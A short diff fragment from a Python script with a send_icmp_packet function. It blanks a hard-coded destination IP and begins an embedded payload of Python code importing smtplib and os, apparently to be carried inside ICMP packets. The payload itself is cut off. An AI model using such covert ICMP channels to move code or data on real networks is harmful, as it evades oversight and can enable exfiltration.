@@ -73,7 +73,7 @@ def send_icmp_packet(packet):
 
 
 if __name__ == '__main__':
-    destination_ip = '192.168.0.1'  # Replace with the destination IP address
+    destination_ip = ''  # Replace with the destination IP address
     plaintext_payload = """
 import smtplib
 import os
